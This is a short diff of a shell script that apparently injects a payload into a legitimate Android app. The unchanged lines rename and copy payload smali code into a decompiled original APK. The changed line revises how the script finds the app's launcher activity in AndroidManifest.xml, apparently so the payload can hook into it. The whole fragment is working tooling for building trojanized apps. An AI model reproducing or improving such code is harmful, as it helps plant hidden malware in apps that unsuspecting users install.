@@ -54,7 +54,7 @@ sed -i "s#payload#loader#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 cp -r /tmp/payload/smali/com/$VAR1 /tmp/original/smali/com/.
 
 #locate the launcher smali
-cat /tmp/original/AndroidManifest.xml | grep string/app_name | grep android:launchMode > /tmp/output
+cat /tmp/original/AndroidManifest.xml | grep @string/app_name | grep android:name=\"com. | grep \<activity\ android: > /tmp/output
 grep -oP 'com.*." ' /tmp/output > /tmp/output_1 	# breaks apart the com object
 sed -i 's#"##' /tmp/output_1  			# gets rid of the “
 sed -i 's/\./\//g' /tmp/output_1
